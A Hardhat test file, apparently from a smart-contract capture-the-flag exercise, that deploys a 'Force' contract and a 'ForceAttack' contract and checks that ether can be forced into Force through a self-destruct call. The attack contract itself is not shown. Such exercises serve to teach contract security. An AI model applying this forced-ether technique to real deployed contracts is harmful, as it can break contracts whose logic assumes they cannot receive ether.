import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";


describe("Force", async () =>{

  it("Should execute force exploit", async () =>{
    await deployments.fixture(["Force","ForceAttack"])
    const {exploiter}= await getNamedAccounts()
    const exploiterAcc= await ethers.getSigner(exploiter)
    const forceDeployment=await deployments.get('Force')
    const forceAttackDeployment=await deployments.get('ForceAttack')
    const force = await ethers.getContractAt('Force',forceDeployment.address)
    const forceAttack = await ethers.getContractAt('ForceAttack',forceAttackDeployment.address)

    const tx=await forceAttack.connect(exploiterAcc).destructAndSendEther(force.address,{value:1})
    await tx.wait()
    
    expect(((await ethers.provider.getBalance(force.address)) as BigNumber).gt(0),"Ether wasn't accepted").to.be.true
    
  });
});
